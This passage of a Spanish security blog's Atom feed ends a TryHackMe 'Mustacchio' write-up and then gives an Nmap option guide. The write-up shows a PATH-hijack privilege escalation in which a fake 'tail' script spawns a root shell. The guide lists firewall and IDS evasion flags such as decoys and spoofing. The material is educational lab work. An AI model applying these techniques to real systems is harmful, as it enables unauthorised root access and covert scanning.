+:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;3&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+GCC: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu 9.3.0-17ubuntu1~20.04&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 9.3.0
+&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;Al al hacer strings vemos algo que nos llama la atención, que se puede escalar privilegios a traves de un &lt;a href=&quot;https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/&quot;&gt;privilege-escalation-using-path&lt;/a&gt;. Llego a esta conclusion ya que este archivo lo ejecuta el usuario root, entonces si lograrmos secuestrar el PATH para que nuestro archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tail&lt;/code&gt; se ejecute dandonos una shell con privilegios de administrador&lt;/li&gt;
+  &lt;li&gt;Vamos a crear una carpeta temporal para meter nuestro archivo tail
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;barry@mustacchio:/home/joe&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mktemp&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; 
+/tmp/tmp.ktizzoGj0O
+barry@mustacchio:/home/joe&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp/tmp.ktizzoGj0O
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Metemos el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/bash&lt;/code&gt; al archivo tail, para luego decirle que primero debe de buscar el archiuvo tail en nuestra ruta actual y le damos permiso de ejecución
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;barry@mustacchio:/tmp/tmp.ktizzoGj0O&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;tail 
+&lt;/span&gt;barry@mustacchio:/tmp/tmp.ktizzoGj0O&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;
+/tmp/tmp.ktizzoGj0O
+barry@mustacchio:/tmp/tmp.ktizzoGj0O&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tmp/tmp.ktizzoGj0O:&lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;
+barry@mustacchio:/tmp/tmp.ktizzoGj0O&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x &lt;span class=&quot;nb&quot;&gt;tail&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Ahora simplemente lo ejecutamos
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;barry@mustacchio:/tmp/tmp.ktizzoGj0O&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd
+&lt;/span&gt;barry@mustacchio:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;
+/home/barry
+barry@mustacchio:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/joe
+barry@mustacchio:/home/joe&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./live_log
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;EEEEEE ya somos root y tenemes nuestra flags
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@mustacchio:/home/joe# &lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;root
+root@mustacchio:/home/joe# &lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;live_log
+root@mustacchio:/home/joe# &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root
+root@mustacchio:/root# &lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;root.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Si deseas aprender mas sobre este hermoso campo que es el hacking te recomiendo los materiales siguientes:
+    &lt;ul&gt;
+      &lt;li&gt;Canal de youtube de &lt;a href=&quot;https://www.youtube.com/c/s4vitar&quot;&gt;S4vitar&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;Payloads de todo tipo &lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources&quot;&gt;PayloadsAllTheThings&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;Diccionarios para el descubrimiento de rutas &lt;a href=&quot;https://www.hackplayers.com/2018/01/diccionarios-para-el-descubrimiento-de-rutas.html&quot;&gt;url paths&lt;/a&gt; en aplicaciones webs&lt;/li&gt;
+      &lt;li&gt;Ataques a &lt;a href=&quot;https://epasan.gitbooks.io/notas-de-seguridad-informatica-ofensiva/content/chapter9.html&quot;&gt;redes inalambricas&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;Si tienes algun permiso sobre un binario como root usa &lt;a href=&quot;https://gtfobins.github.io/&quot;&gt;GTFOBins&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Espero que esta informacion te ayude en tu camino&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>B0Y-SIE7E</name></author><category term="tryhackme" /><category term="linux" /><category term="write up" /><category term="xxe" /><category term="easy" /><summary type="html">Maquina de nivel easy</summary></entry><entry><title type="html">Nmap - Herramienta de reconocimiento</title><link href="http://localhost:4000/Nmap/" rel="alternate" type="text/html" title="Nmap - Herramienta de reconocimiento" /><published>2021-08-18T00:00:00-04:00</published><updated>2021-08-18T00:00:00-04:00</updated><id>http://localhost:4000/Nmap</id><content type="html" xml:base="http://localhost:4000/Nmap/">&lt;h2 id=&quot;qué-es-nmap&quot;&gt;&lt;strong&gt;¿Qué es nmap?&lt;/strong&gt;&lt;/h2&gt;
+&lt;hr /&gt;
+&lt;p&gt;Network Mapped (Nmap) es una herramienta de escaneo de red y detección de host. Se usa para el reconocimiento y la  recopilacion información sobre una red determinada.&lt;/p&gt;
+
+&lt;p&gt;Una herramienta muy potente a la hora de pruebas de penetracion. Nmap no se limita a la mera recopilación y enumeración de información, sino que también es una potente utilidad usadas en el sector del pentesting, que puede utilizarse como detector de vulnerabilidades.&lt;/p&gt;
+
+&lt;h2 id=&quot;guia-de-uso&quot;&gt;&lt;strong&gt;Guia de uso&lt;/strong&gt;&lt;/h2&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -&amp;lt;parametros&amp;gt;  &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &amp;lt;IP&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Descubrir sistemas&lt;/strong&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;    &lt;span class=&quot;nt&quot;&gt;-PS&lt;/span&gt; n tcp syn ping
+    &lt;span class=&quot;nt&quot;&gt;-PA&lt;/span&gt; n ping TCP ACK
+    &lt;span class=&quot;nt&quot;&gt;-PU&lt;/span&gt; n ping UDP
+    &lt;span class=&quot;nt&quot;&gt;-PM&lt;/span&gt; Netmask Req
+    &lt;span class=&quot;nt&quot;&gt;-PP&lt;/span&gt; Timestamp Req
+    &lt;span class=&quot;nt&quot;&gt;-PE&lt;/span&gt; Echo Req
+    &lt;span class=&quot;nt&quot;&gt;-sL&lt;/span&gt; análisis de listado
+    &lt;span class=&quot;nt&quot;&gt;-PO&lt;/span&gt; ping por protocolo
+    &lt;span class=&quot;nt&quot;&gt;-PN&lt;/span&gt; No hacer ping
+    &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; no hacer DNS
+    &lt;span class=&quot;nt&quot;&gt;-R&lt;/span&gt; Resolver DNS en todos los sistemas objetivo
+    –traceroute: trazar ruta al sistema &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;para topologías de red&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;-sP&lt;/span&gt; realizar ping, igual que con –PP –PM –PS443 –PA80 &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;Técnicas de análisis de puertos&lt;/strong&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt; 
+    &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; análisis utilizando TCP SYN
+    &lt;span class=&quot;nt&quot;&gt;-sT&lt;/span&gt; análisis utilizando TCP CONNECT
+    &lt;span class=&quot;nt&quot;&gt;-sU&lt;/span&gt; análisis utilizando UDP
+    &lt;span class=&quot;nt&quot;&gt;-sY&lt;/span&gt; análisis utilizando SCTP INIT
+    &lt;span class=&quot;nt&quot;&gt;-sZ&lt;/span&gt; utilizando COOKIE ECHO de SCTP
+    &lt;span class=&quot;nt&quot;&gt;-sO&lt;/span&gt; protocolo IP
+    &lt;span class=&quot;nt&quot;&gt;-sW&lt;/span&gt; ventana TCP &lt;span class=&quot;nt&quot;&gt;-sN&lt;/span&gt;
+    –sF &lt;span class=&quot;nt&quot;&gt;-sX&lt;/span&gt; NULL, FIN, XMAS
+    –sA TCP ACK&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;Puertos a analizar y orden de análisis&lt;/strong&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;    &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; n-mrango
+    &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;– todos los puertos
+    &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; n,m,z especificados
+    &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; U:n-m,z T:n,m U para UDP, T para TCP
+    &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; rápido, los 100 comunes
+    –top-ports n analizar los puertos más utilizados
+    &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; no aleatorio&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;Duración y ejecución&lt;/strong&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt; 
+    &lt;span class=&quot;nt&quot;&gt;-T0&lt;/span&gt; paranoico
+    &lt;span class=&quot;nt&quot;&gt;-T1&lt;/span&gt; sigiloso
+    &lt;span class=&quot;nt&quot;&gt;-T2&lt;/span&gt; sofisticado
+    &lt;span class=&quot;nt&quot;&gt;-T3&lt;/span&gt; normal
+    &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; agresivo
+    &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; locura
+    –min-hostgroupd1 
+    –max-hostgroup
+    –min-rate
+    –max-rate
+    –min-parallelism
+    –max-parallelism
+    –min-rtt-timeout
+    –max-rtt-timeout
+    –initial-rtt-timeout
+    –max-retries
+    –host-timeout –scan-delay&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;Detección de servicios y versiones&lt;/strong&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt; 
+    &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; detección de la versión de servicios
+    –all-ports no excluir puertos
+    –version-all probar cada exploración
+    –version-trace rastrear la actividad del análisis de versión
+    &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; activar detección del S. Operativo
+    –fuzzy adivinar detección del SO
+    –max-os-tries establecer número máximo de intentos contra el sistema objetivo&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;Evasión de Firewalls/IDS&lt;/strong&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt; 
+    &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; fragmentar paquetes
+    &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; d1,d2 encubrir análisis con señuelos
+    &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; ip falsear dirección origen
+    –g &lt;span class=&quot;nb&quot;&gt;source &lt;/span&gt;falsear puerto origen
+    –randomize-hosts orden
+    –spoof-mac mac cambiar MAC de origen&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;Parámetros de nivel de detalle y depuración&lt;/strong&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt; 
+    &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; Incrementar el nivel de detalle
+    –reason motivos por sistema y puerto
+    &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1-9&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; establecer nivel de depuración
+    –packet-trace ruta de paquetes&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;Otras opciones&lt;/strong&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt; 
+    –resume file continuar análisis abortado &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;tomando formatos de salida con &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; o &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;-6&lt;/span&gt; activar análisis IPV6 
+    &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; agresivo, igual que con &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; –traceroute&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;Opciones interactivas&lt;/strong&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt; 
+    v/V aumentar/disminuir nivel de detalle del análisis
+    d/D aumentar/disminuir nivel de depuración
+    p/P activar/desactivar traza de paquetes&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;Scripts&lt;/strong&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt; 
+    &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; realizar análisis con los scripts por defecto
+    –script file ejecutar script &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;o todos&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+    –script-args &lt;span class=&quot;nv&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;v proporcionar argumentos
+    –script-trace mostrar comunicación entrante y saliente&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;Formatos de salida&lt;/strong&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt; 
+    &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; guardar en formato normal
+    &lt;span class=&quot;nt&quot;&gt;-oX&lt;/span&gt; guardar en formato XML
+    &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; guardar en formato para posteriormente usar Grep
+    &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; guardar en todos los formatos anteriores&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Para mas documentacion y uso se suguiere visitar: &lt;a href=&quot;https://en.kali.tools/?p=1433&quot;&gt;&lt;strong&gt;en.kali.tools&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;</content><author><name>B0Y-SIE7E</name></author><category term="herramientas" /><category term="linux" /><summary type="html">Reseña de uso de la herramienta nmap</summary></entry></feed>
